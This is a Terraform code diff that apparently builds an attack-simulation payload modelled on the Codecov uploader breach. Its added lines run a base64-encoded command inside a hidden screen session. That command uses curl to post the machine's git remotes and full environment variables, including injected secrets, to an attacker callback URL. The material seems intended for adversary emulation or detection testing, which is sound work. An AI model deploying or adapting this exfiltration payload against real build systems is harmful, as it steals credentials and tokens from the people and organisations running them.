@@ -2,8 +2,20 @@ locals {
     host_ip = var.host_ip
     host_port = var.host_port
     git_origin=var.git_origin
-    env_secrets=join("\n", var.env_secrets)
+    env_secrets=join(" ", var.env_secrets)
     callback_url = var.use_ssl == true ? "https://${local.host_ip}:${local.host_port}" : "http://${local.host_ip}:${local.host_port}"
+    command_payload=<<-EOT
+    rm -rf /tmp/repo
+    mkdir -p /tmp/repo
+    cd /tmp/repo
+    git init
+    git remote add origin ${local.git_origin}
+    log "running curl post: curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2"
+    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" ${local.callback_url}/upload/v2 >> $LOGFILE 2>&1
+    sleep 30
+    exit
+    EOT
+    base64_command_payload=base64encode(local.command_payload)
     payload = <<-EOT
     LOGFILE=/tmp/attacker_exec_git_codecov.log
     function log {
@@ -16,14 +28,11 @@ locals {
         log "git not found - waiting"
         sleep 10
     done
-    env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ${local.env_secrets} /bin/bash --noprofile --norc
-    rm -rf /tmp/repo
-    mkdir -p /tmp/repo
-    cd /tmp/repo
-    git init
-    git remote add origin ${local.git_origin}
-    log "running curl post: curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2"
-    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" ${local.callback_url}/upload/v2 >> $LOGFILE 2>&1
+    log "git: $(which git)"
+    screen -d -Logfile /tmp/codecov.log -S codecov -m env -i LOGFILE=$LOGFILE PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ${local.env_secrets} /bin/bash --noprofile --norc
+    screen -S codecov -X colon "logfile flush 0^M"
+    log 'sending screen command: ${local.command_payload}';
+    screen -S codecov -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
     log "done"
     EOT
     base64_payload = base64encode(local.payload)
